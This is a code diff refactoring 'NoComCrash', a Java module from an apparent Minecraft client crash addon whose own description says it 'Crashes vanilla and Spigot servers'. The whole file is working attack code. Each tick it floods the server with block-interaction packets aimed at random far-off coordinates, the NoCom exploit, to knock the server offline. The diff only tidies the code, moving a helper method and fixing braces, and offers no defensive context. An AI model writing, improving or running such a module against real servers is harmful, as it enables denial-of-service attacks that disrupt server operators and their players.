@@ -16,13 +16,8 @@ import java.util.Objects;
 import java.util.Random;
 
 public class NoComCrash extends Module {
-    final Random r = new Random();
-    Vec3d pickRandomPos() {
-        int x = this.r.nextInt(0xFFFFFF);
-        int y = 255;
-        int z = this.r.nextInt(0xFFFFFF);
-        return new Vec3d(x, y, z);
-    }
+    private final Random r = new Random();
+
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
         .name("amount")
@@ -34,14 +29,19 @@ public class NoComCrash extends Module {
     );
 
     public NoComCrash() {
-        super(CrashAddon.CATEGORY, "NoCom-Crash", "Crashes vanilla and Spigot servers");
+        super(CrashAddon.CATEGORY, "NoCom-crash", "Crashes vanilla and Spigot servers");
     }
 
+    private Vec3d pickRandomPos() {
+        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
+    }
+    
     @EventHandler
     private void onTick(TickEvent.Post event) {
         for (int i = 0; i < amount.get(); i++) {
             Vec3d cpos = pickRandomPos();
             PlayerInteractBlockC2SPacket PACKET = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
             Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(PACKET);
+        }
     }
-}}
+}
